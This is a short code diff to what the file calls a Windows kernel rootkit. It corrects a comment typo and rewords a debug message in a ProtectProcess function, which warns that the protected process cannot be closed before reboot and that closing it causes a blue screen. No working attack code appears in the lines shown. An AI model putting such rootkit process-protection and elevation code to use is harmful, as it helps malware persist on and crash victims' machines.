@@ -1,5 +1,5 @@
 ////
-//		FUNCTIONS USED TO ELEVAET AND PROTECTS PROCESSES
+//		FUNCTIONS USED TO ELEVATE AND PROTECTS PROCESSES
 ////
 #include "Rootkit.h"
 
@@ -63,7 +63,7 @@ NTSTATUS ProtectProcess(DWORD PID)
 		return status;
 	}
 	KdPrint(("[!] The process has become part of the system!\n"));
-	KdPrint(("[!] You want be able to close process untile next reboot\n"));
+	KdPrint(("[!] You won't be able to close the process until next reboot. Closing the process will result in a blue screen\n"));
 
 	ZwClose(hToken);
 	return status;
